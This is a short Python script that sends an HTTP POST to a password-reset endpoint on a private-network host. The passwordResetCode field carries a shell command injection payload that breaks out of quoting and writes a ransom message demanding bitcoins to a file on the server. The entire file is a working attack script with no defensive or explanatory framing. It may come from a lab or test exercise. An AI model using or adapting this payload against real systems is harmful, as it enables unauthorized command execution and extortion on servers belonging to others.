import requests


def post_bash_injection():
    host = "http://192.168.1.117:8080"
    endpoint = "/resetPassword"

    headers = {
        "Content-Type": "application/json"
    }

    data = {
        "passwordResetCode": "\" ; echo You are hacked, give me bitcoins > ransom14; \" "
    }

    request = requests.Request("POST", f"{host}{endpoint}", headers=headers, json=data)
    prepared_request = request.prepare()

    session = requests.Session()
    response = session.send(prepared_request)

    print(f"Request URL: {prepared_request.url}")
    print(f"Request Headers: {prepared_request.headers}")
    print(f"Request Body: {prepared_request.body}")
    print(f"Response: {response.text}")


if __name__ == "__main__":
    post_bash_injection()
